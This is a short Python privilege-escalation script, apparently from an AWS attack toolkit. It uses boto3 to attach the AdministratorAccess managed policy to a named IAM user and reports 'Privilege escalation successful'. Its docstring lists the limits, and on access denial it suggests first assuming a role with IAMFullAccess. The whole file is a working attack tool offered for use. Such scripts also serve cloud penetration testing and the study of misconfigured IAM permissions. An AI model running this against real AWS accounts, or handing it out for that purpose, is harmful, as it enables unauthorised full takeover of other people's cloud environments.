"""
What it does:
  - Takes a target username as argument
  - Attaches AWS managed AdministratorAccess policy to that user
  - Confirms the policy was attached successfully
  - Target user instantly becomes admin

What it cannot do:
  - Work without iam:AttachUserPolicy permission
  - Attach policies to roles (use attach_role_policy.py for that)
  - Bypass Service Control Policies (SCPs) in AWS Organizations
  - Work if a Permission Boundary restricts the target user
"""

import boto3
import botocore
import sys

ADMIN_POLICY_ARN = "arn:aws:iam::aws:policy/AdministratorAccess"

def attach_admin_policy(username):

    try:
        iam = boto3.client('iam')

        print(f"\n[i] Target user      : {username}")
        print(f"[i] Policy to attach : AdministratorAccess")

        # Check current policies before
        print(f"\n[i] Current policies on {username}:")
        current = iam.list_attached_user_policies(
            UserName=username
        )['AttachedPolicies']

        if not current:
            print(f"    None")
        else:
            for p in current:
                print(f"    - {p['PolicyName']}")

        # Attach AdministratorAccess
        iam.attach_user_policy(
            UserName=username,
            PolicyArn=ADMIN_POLICY_ARN
        )

        print(f"\n[+] AdministratorAccess attached to {username}")

        # Confirm
        print(f"\n[i] Policies on {username} after attack:")
        updated = iam.list_attached_user_policies(
            UserName=username
        )['AttachedPolicies']

        for p in updated:
            if p['PolicyName'] == 'AdministratorAccess':
                print(f"    [!] {p['PolicyName']} ← attached now")
            else:
                print(f"    - {p['PolicyName']}")

        print(f"\n[+] Privilege escalation successful")
        print(f"[+] {username} now has full administrator access")

    except botocore.exceptions.ClientError as e:
        code = e.response['Error']['Code']
        if code == 'AccessDenied':
            print(f"[x] AccessDenied — need iam:AttachUserPolicy permission")
            print(f"[i] Try: assume a role with IAMFullAccess first")
            print(f"         python3 assume_role.py <role_arn>")
        elif code == 'NoSuchEntity':
            print(f"[x] User not found: {username}")
        else:
            print(f"[x] Error {code}: {e}")
    except botocore.exceptions.NoCredentialsError:
        print("[x] No credentials — run: aws configure")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("\n[!] Usage: python3 attach_admin_policy.py <username>")
        print("    Example: python3 attach_admin_policy.py omar")
        sys.exit(1)

    username = sys.argv[1]
    attach_admin_policy(username)
